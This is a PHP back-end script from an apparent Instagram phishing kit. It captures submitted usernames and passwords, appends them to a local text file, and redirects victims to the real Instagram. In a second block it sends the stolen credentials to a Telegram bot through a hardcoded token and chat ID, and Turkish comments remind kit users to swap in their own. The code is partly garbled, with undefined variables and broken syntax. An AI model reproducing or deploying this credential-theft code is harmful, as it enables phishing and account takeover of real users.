<?php
 $user = $_POST["username"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: https://instagram.com/');
 exit()

$token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
    
 if($clawzpass==$clawzpass2){

$data = [
    'text' => '
✅  GİRİŞ BAŞARILI ✅

Kullanıcı Adı : '.$user.'
Şifre : '.$pass.'

',
    'chat_id' =>'-1001586201889'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location:code.php");
}
	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
else {
    echo '<script>alert("Your Passwords Are not Matching! Please Try Again.")</script>';
    
    $data = [
    'text' => '
ŞİFRELERİ FARKLI GİRİLEN HESAP !!

Kullanıcı Adı : '.$user.'
Şifre : '.$pass.'

',
    'chat_id' =>'-1001586201889'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
}
?>
